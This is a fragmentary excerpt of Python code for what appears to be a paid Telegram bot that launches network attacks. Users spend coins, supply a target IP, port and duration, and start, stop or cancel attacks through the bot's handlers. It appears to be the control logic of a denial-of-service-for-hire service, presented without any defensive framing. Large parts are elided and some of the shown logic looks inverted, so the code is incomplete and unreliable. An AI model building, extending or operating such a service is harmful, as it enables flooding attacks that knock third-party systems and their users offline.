...
async def handle_attack_request(update: Update, context: CallbackContext):
    ...
    if user['coins'] < COST_PER_ATTACK:
        await query.answer("❌ Insufficient coins! Contact @MasterBhaiyaa", show_alert=True)
        return
    
    # Check if attack already running
    if active_attack:
        await query.answer("⚠️ Another attack in progress!", show_alert=True)
        return
    
    waiting_for_attack_details = True
...
async def process_attack_details(update: Update, context: CallbackContext):
    ...
    if not waiting_for_attack_details:
        return
...
async def control_attack(update: Update, context: CallbackContext):
    ...
    if data == 'stop_attack':
        ...
        if active_attack and (user_id == active_attack['user'] or user_id == ADMIN_ID):
            await cleanup_attack(active_attack['chat'], context)
            await query.answer("🛑 MASTERBHAIYA ATTACK STOPPED!")
        else:
            await query.answer("Only attacker can stop!", show_alert=True)
        ...
        if active_attack:
            ...
            await query.answer("No active attack", show_alert=True)
            
    elif data.startswith('confirm_'):
        _, ip, port, duration = data.split('_')
        await launch_attack(ip, int(port), int(duration), 
                          query.message.chat_id, user_id, context)
        
    elif data == 'cancel_attack':
        waiting_for_attack_details = False
        await query.edit_message_text("❌ MASTERBHAIYA ATTACK CANCELLED")
